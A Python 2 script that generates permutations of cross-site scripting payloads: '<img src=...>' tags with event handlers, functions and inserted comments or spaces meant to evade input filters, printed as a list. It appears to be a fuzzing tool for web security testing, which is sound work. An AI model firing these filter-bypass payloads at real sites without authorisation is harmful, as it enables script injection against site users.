import database


class Payload:
    def __init__(self):
        self.payloads1 = []
        self.payloads2 = []
        self.payloads3 = []
        self.functions = database.Database().functions
        self.events = database.Database().events
        self.object = 'img'
        self.comment = '/*123*/'
        self.src = 'src=1'
        self.src2 = 'src="1"'
        self.space = ' '
        self.message = '(1)'
        self.message2 = '`1`'

    def addspace(self, value):
        return value + self.space

    def addcomment(self, value):
        return value + self.comment

    def combine1(self):
        for i in range(0, 2):
            for j in range(0, 2):
                for k in range(0, 2):
                    for l in range(0, 3):
                        for m in range(0, 2):
                            for n in range(0, self.events.__len__()):
                                for o in range(0, self.functions.__len__()):
                                    for p in range(0, 2):
                                        payload = '<' + self.object
                                        if i is 0:
                                            payload = self.addspace(payload)
                                        if i is 1:
                                            payload = self.addcomment(payload)
                                        if j is 0:
                                            payload += self.src
                                        if j is 1:
                                            payload += self.src2
                                        if j is 0:
                                            payload = self.addspace(payload)
                                        if j is 1:
                                            pass
                                        payload += self.events[n]
                                        if k is 0:
                                            pass
                                        if k is 1:
                                            payload = self.addspace(payload)
                                        payload += '='
                                        if l is 0:
                                            payload = self.addspace(payload)
                                        if l is 1:
                                            payload = self.addcomment(payload)
                                        if l is 2:
                                            pass
                                        payload += self.functions[o]
                                        if m is 0:
                                            pass
                                        if m is 1:
                                            payload = self.addcomment(payload)
                                        if p is 0:
                                            payload += self.message
                                        if p is 1:
                                            payload += self.message2
                                        payload += '>'
                                        self.payloads1.append(payload)

pay = Payload()
pay.combine1()
for item in pay.payloads1:
    print item





